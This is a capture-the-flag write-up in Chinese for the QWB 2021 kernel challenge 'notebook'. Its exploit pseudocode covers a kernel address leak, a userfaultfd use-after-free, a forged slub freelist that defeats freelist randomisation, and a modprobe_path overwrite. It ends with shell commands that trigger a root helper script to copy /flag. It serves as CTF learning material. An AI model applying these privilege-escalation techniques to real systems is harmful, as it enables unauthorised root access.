# qwb2021 notebook

## 泄露地址

1.读取未初始化数据

```c
fd[i] = open("/proc/self/stat", 0) for i in range(SPRAY)
close(fd[i]) for i in range(SPRAY)
noteadd(i, 0x20) for i in range(SPRAY)
read(fd, data, i) for i in range(SPRAY)
kernel_base = data[0] - offset_single_start
```

2. 通过userfaultfd来实现UAF，类似于knote那一道题，然而本题读不到新的结构体，猜测可能是cache的原因

```c
register(fault_page, handler)
def handler():
	notedel(0)
	open("/proc/self/stat", 0)
	mmap(0,PAGE_SIZE,...)
	ioctl(uffd, UFFC_COPY, &uc)
read(fd, falt_page, 0)
```

3.构造fake_slub指向notebook-0x10，然后实现任意地址读写，通过读取0x167（call copy_from_user）来泄露地址

```
(gdb) x/6i 0xffffffffc0002000+0x167
	0xffffffffc0002167 <noteadd+87>:	callq  0xffffffff81476c30（copy_from_user）
(gdb) x/6bx 0xffffffffc0002000+0x167
	0xffffffffc0002167 <noteadd+87>:	0xe8	0xc4	0x4a	0x47	0xc1	0x48
(gdb) x/wx 0xffffffffc0002168
	0xffffffffc0002168 <noteadd+88>:	0xc1474ac4
(gdb) p/x 0xffffffff81476c30-0xffffffffc000216c
	$13 = 0xffffffffc1474ac4
kernel_base = (int64_t)0xc1474ac4+0xffffffffc000216c-0x1476c30 = 0xffffffff81000000

```

## 构造fake_slub

1.exp申请的第一个块不一定是该kmem_cache的第一个块

2.伪造的fake_slub，一定要保证fake_slub→freelist指向0或者存在映射(mmap⇒vma)，如果是后者一定要通过alloc去分配，否则其他core分配时会出错(因为其他进程没有这个mmap)；如果内核开启了SMAP则映射的地址不能是用户态，因此最好是0.

3.为了修改modprobe_path，不能直接指向这个地址，否则由于modprobe_path→freelist不合法而出错。正确的做法是，将free_slub→freelist指向notebook附近，**且需要存在修改notebook附近的该slub→freelist的途径**，例如此题的name，可以修改这个freelist。

### 猜测random+修改modprobe_path

```c
noteadd(0,0x60)
noteadd(1,0x60)
gift(data)
addr0, addr1 = data[0], data[2]
notedel(0)
notedel(1) //kmem_cache_cpu->addr1->addr0
noteadd(0,0x60)
gift(data)
assert(data[0] == addr1)
read(fd,data,0)
random = data[0]^addr1^addr0
magic = notebook_base+0x2500-0x10
def writeHeapFree():
	register(userbuf, handler)
	write(fd, userbuf, 0)
def handler():
	notedel(0)
	write(0,addr1^magic^random)
	page_in()
	writeHeapFree()
tmp[0xf0] = random ^ (notebook_base+0x2500-0x10) //make it the last slub
noteadd(0,0x60,tmp)
gift(data)
assert(data[0] == addr1)
noteadd(1,0x60,tmp)
data[2]=0x168
data[4]=0x2500 //notebook[1]->ptr = notebook[0]
write(fd,data,1)
read(fd,data,0)
kernel_base=*(int32*)&data[0]+notebook_base+0x16c-0x1476c30
data[0] = modprobe_path_offset + kernel_base
write(fd,data,1)
strcpy(data,"/tmp/1.sh")
write(fd,data,0)

system("echo -ne '#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag' > /tmp/1.sh");
system("echo -ne '\xff\xff\xff\xff' > /tmp/aaa");
system("chmod +x /tmp/1.sh");
system("chmod +x /tmp/aaa");
system("/tmp/aaa");
system("cat /tmp/flag");
```
